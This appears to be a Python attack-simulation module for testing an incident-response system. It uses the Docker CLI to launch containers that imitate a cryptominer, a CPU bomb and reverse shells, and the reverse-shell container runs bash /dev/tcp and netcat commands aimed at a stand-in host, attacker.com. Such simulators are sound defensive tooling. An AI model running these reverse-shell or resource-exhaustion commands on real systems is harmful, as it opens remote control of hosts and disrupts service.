# attack_simulator/real_attacks.py (WINDOWS-COMPATIBLE)
"""
REAL attack simulator using Docker CLI (Windows compatible).
"""

import subprocess
import asyncio
import structlog
import json
from typing import Optional

log = structlog.get_logger()

class RealDockerAttacker:
    """Deploy REAL attack containers using Docker CLI."""
    
    def __init__(self):
        # Test Docker is available
        try:
            result = subprocess.run(['docker', 'version'], 
                                  capture_output=True, 
                                  text=True, 
                                  check=True)
            log.info("Docker CLI initialized successfully")
        except Exception as e:
            log.error("Docker not available. Is Docker Desktop running?", error=str(e))
            raise
        
        self.deployed_containers = []
    
    def _run_docker_command(self, args: list) -> str:
        """Run docker command and return output."""
        try:
            result = subprocess.run(
                ['docker'] + args,
                capture_output=True,
                text=True,
                check=True
            )
            return result.stdout.strip()
        except subprocess.CalledProcessError as e:
            log.error("Docker command failed", args=args, error=e.stderr)
            raise
    
    async def attack_cryptominer(self) -> str:
        """Deploy REAL cryptominer container."""
        log.info("🚨 DEPLOYING REAL CRYPTOMINER ATTACK...")
        
        timestamp = int(asyncio.get_event_loop().time())
        container_name = f"attack-cryptominer-{timestamp}"
        
        try:
            # Run container
            container_id = self._run_docker_command([
                'run',
                '-d',  # Detach
                '--rm',  # Auto-remove
                '--name', container_name,
                '--network', 'ir-system_attack-net',
                '--cpus', '0.5',  # Limit CPU
                'alpine:latest',
                'sh', '-c',
                '''
                echo "[+] Starting cryptominer..."
                echo "xmrig --url stratum+tcp://pool.minexmr.com:4444 --user wallet"
                
                echo "[+] Mining cryptocurrency..."
                for i in 1 2 3; do
                    (while true; do :; done) &
                done
                
                wait
                '''
            ])
            
            container_id = container_id[:12]
            self.deployed_containers.append(container_id)
            
            log.info("✅ Cryptominer deployed",
                    container_id=container_id,
                    name=container_name)
            
            return container_id
            
        except Exception as e:
            log.error("Failed to deploy cryptominer", error=str(e))
            raise
    
    async def attack_reverse_shell(self) -> str:
        """Deploy REAL reverse shell container."""
        log.info("🚨 DEPLOYING REAL REVERSE SHELL ATTACK...")
        
        timestamp = int(asyncio.get_event_loop().time())
        container_name = f"attack-shell-{timestamp}"
        
        try:
            container_id = self._run_docker_command([
                'run',
                '-d',
                '--rm',
                '--name', container_name,
                '--network', 'ir-system_attack-net',
                'alpine:latest',
                'sh', '-c',
                '''
                echo "[+] Attempting reverse shell..."
                
                # Technique 1: bash -i
                bash -i >& /dev/tcp/attacker.com/4444 0>&1 2>/dev/null || true
                
                # Technique 2: sh -i  
                sh -i 2>&1 | nc attacker.com 4444 2>/dev/null || true
                
                echo "[+] Reverse shell attempts completed"
                sleep 30
                '''
            ])
            
            container_id = container_id[:12]
            self.deployed_containers.append(container_id)
            
            log.info("✅ Reverse shell deployed",
                    container_id=container_id,
                    name=container_name)
            
            return container_id
            
        except Exception as e:
            log.error("Failed to deploy reverse shell", error=str(e))
            raise
    
    async def attack_cpu_bomb(self) -> str:
        """Deploy REAL CPU bomb container."""
        log.info("🚨 DEPLOYING REAL CPU BOMB ATTACK...")
        
        timestamp = int(asyncio.get_event_loop().time())
        container_name = f"attack-cpubomb-{timestamp}"
        
        try:
            container_id = self._run_docker_command([
                'run',
                '-d',
                '--rm',
                '--name', container_name,
                '--network', 'ir-system_attack-net',
                '--cpus', '0.7',  # Limit to 70% CPU
                'alpine:latest',
                'sh', '-c',
                '''
                echo "[+] Starting CPU bomb..."
                
                for i in 1 2 3 4 5; do
                    (while true; do :; done) &
                done
                
                echo "[+] CPU bomb active"
                wait
                '''
            ])
            
            container_id = container_id[:12]
            self.deployed_containers.append(container_id)
            
            log.info("✅ CPU bomb deployed",
                    container_id=container_id,
                    name=container_name)
            
            return container_id
            
        except Exception as e:
            log.error("Failed to deploy CPU bomb", error=str(e))
            raise
    
    async def cleanup_attack(self, container_id: str):
        """Stop and remove attack container."""
        try:
            self._run_docker_command(['stop', container_id])
            log.info("🛑 Attack container stopped", container_id=container_id)
        except subprocess.CalledProcessError:
            log.warning("Container already stopped", container_id=container_id)
    
    async def cleanup_all(self):
        """Stop all deployed attack containers."""
        log.info("🧹 Cleaning up all attack containers...")
        for container_id in self.deployed_containers:
            try:
                self._run_docker_command(['stop', container_id])
            except:
                pass
        self.deployed_containers.clear()

# Singleton instance
real_attacker = RealDockerAttacker()